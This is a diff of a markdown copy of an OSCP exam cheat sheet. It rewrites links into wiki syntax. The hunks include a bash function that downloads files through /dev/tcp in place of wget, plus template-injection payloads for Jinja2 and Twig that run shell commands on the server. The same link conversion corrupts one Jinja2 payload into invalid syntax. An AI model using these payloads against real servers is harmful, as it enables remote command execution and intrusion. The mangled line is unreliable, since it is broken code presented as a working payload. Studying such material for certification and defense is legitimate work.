@@ -1,4 +1,4 @@
-> HTML Page: [Open HTML Page](HTML%20Pages/Free%20Notes/Cybersecurity/Certifications/OSCP%20Certification%20Cheat%20Sheet%202026.html)
+> HTML Page: [[HTML Pages/Free Notes/Cybersecurity/Certifications/OSCP Certification Cheat Sheet 2026.html|Open HTML Page]]
 
 [🏠 Main Site](https://motasem-notes.net/) · [🛒 Store](https://shop.motasem-notes.net/) · [▶ YouTube](https://www.youtube.com/@MotasemHamdan) · [☕ Membership](https://buymeacoffee.com/notescatalog/membership)
 
@@ -126,12 +126,12 @@ function __wget() {
     local URL=$1
     read proto server path <<<$(echo ${URL//// })
     DOC=/${path// //}; HOST=${server//:*}; PORT=${server//*:}
-    [ x"${HOST}" == x"${PORT}" ](%20x"${HOST}"%20==%20x"${PORT}"%20) && PORT=80
+    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
     exec 3<>/dev/tcp/${HOST}/$PORT
     echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\nConnection: close\r\n\r\n" >&3
     while read line; do
-        [ $mark -eq 1 ](%20$mark%20-eq%201%20) && echo $line
-        if [ "${line}" =~ "Connection: close" ](%20"${line}"%20=~%20"Connection:%20close"%20); then mark=1; fi
+        [[ $mark -eq 1 ]] && echo $line
+        if [[ "${line}" =~ "Connection: close" ]]; then mark=1; fi
     done <&3
     exec 3>&-
 }
@@ -797,7 +797,7 @@ ${{<%[%'"}}%\.
 # Jinja2 / Flask
 {{ ''.__class__.__mro__[1].__subclasses__() }}
 {{ config.items() }}
-{{ ''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate() }}
+{{ ''.__class__.__mro__[[)[408]('id',shell=True,stdout=-1|1]].communicate() }}
 
 # Twig (PHP)
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
